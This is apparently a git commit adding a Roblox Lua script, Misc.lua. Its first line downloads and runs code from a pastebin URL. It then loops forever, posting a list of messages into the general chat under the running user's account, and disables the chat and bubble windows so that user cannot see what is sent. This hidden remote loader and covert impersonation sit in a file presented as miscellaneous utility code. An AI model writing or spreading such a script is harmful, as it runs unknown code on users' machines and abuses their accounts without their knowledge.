13823769be1dae511edba4699c267a42184fc8a7
CarexHub <sys.krnl@proton.me>
2025-06-05 17:45:26 +0200

    Add files via upload

---
+++ Misc.lua
@@ -0,0 +1,33 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/ZjqfXeNN"))()
+
+
+local SpamInterval = 5
+
+function SendMsgByUser(Msg)
+    local Chat = game:GetService("TextChatService"):WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+    Chat:SendAsync(Msg)
+end
+
+function DisableChatVisibility()
+    local BubbleChat = game:GetService("TextChatService"):WaitForChild("BubbleChatConfiguration")
+    local Chat = game:GetService("TextChatService"):WaitForChild("ChatWindowConfiguration")
+
+    BubbleChat.Enabled = false
+    Chat.Enabled = false
+end
+
+function SpamChat()
+    while true do
+        for _, Message in getfenv().ChatMessages do
+            if not getfenv().Dev then
+                DisableChatVisibility()
+            end
+            SendMsgByUser(Message)
+            task.wait(SpamInterval)
+        end
+    end
+end
+
+if not getfenv().config["StealthMode"] == true then
+    task.spawn(SpamChat)
+end
